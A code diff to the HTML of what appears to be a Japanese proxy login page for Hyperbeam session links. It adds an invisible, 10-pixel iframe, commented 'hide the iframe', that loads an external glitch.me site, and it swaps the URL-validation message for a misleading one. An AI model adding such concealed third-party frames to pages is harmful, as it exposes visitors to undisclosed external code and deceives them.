@@ -67,7 +67,7 @@
 <p>ログインポータル</p>
 <h4>当サービスは現在試験的な公開を行っています。安定した動作を保証するものではございませんのでバグっても文句言ってくんな</h4>
 <form class="url" method="POST" action="/proxy/session/">
-    <input placeholder="セッションリンクのURLをペーストしてください。" name="url" id="iurl" type="text" pattern=".*hyperbeam\.com.*" title="URLが無効です。">
+    <input placeholder="セッションリンクのURLをペーストしてください。" name="url" id="iurl" type="text" pattern=".*hyperbeam\.com.*" title="[エラーが発生しました]ご入力いただいたURLはサーバー内で発見できませんでした。">
     <button type="submit" id="btn">確定</button>
 
     
@@ -77,6 +77,10 @@
     </a>
 </div>
 </div>
+<!--iframeを隠す-->
+<div style="opacity: 0;">
+        <iframe src="https://chocolate-glen-flyaway.glitch.me" width="10px" height="10px"></iframe>
+      </div>
 <!-- admax -->
 <script src="https://adm.shinobi.jp/s/99e1f4ed38a04395ffbcc9a9a3e47b42"></script>
 <!-- admax -->
